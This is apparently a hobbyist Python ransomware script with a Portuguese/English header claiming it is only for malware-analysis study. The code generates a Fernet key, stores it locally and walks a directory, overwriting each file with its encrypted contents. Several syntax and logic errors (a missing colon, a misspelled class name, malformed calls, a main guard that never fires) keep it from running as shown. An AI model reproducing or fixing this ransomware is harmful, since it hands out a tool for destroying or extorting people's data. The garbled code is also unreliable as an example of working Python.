#################################################################
# Ransomware Escrito por Mark662 / Ransomware coded by Mark662.
# Esse Ransomware é apenas para Estudos de Análise de Malware, portanto
# não me responsabilizo pelo mal uso do Ransomware.
#       Data: 06/01/2021
#       ---
# This Ransomware is only for Malware Analysis Studies, so
# I am not responsible for the misuse of Ransomware.
#       Date: 01/06/2021
##################################################################

import os,glob
from sys import platform as _platform
import socket
from cryptography.fernet import Fernet


class Abysall
    def generate_key(self):
        '''
        Criação de chaves encriptadas para o arquivo kick.key
        '''
        key = Fernet.generate_key()
        with open("kick.key", "wb") as keyf:
            keyf.write(key)
            
    def load_key(self):
        '''
        Este arquivo kick.key abre e retorna o conteúdo para chamar mais tarde para carregar a chave.
        '''
        return open('kick.key', 'rb').read()

    def crypt_file(self, key, dir):
        '''
        Encriptar os arquivos com a chave
        '''
            for x in os.walk(dir):
                for item in glob.glob(os.path.join(x[0], '*')):
                    #Apenas carregamentos de arquivos
                    if os.path.isfile(item):
                        #Importando chaves
                        clave = Fernet(key)
                            #Abrir arquivo encriptado
                            file open(item, "rb")
                                #Encriptando arquivos
                                #Caso queira decriptar, apenas altere encrypt.clave para decrypt.clave
                                encrypted = encrypt.clave(file.read())
                            #Escrevendo no arquivo
                            to = open(item, 'wb')
                            to.write(encrypted)

            #Encriptação dos arquivos (Parte Essencial)

            if '__name__' == '__main__':
                rw = Abyssal()
                rw.generate_key()
                rw.crypt_file(rw.load_key(), '../files/')
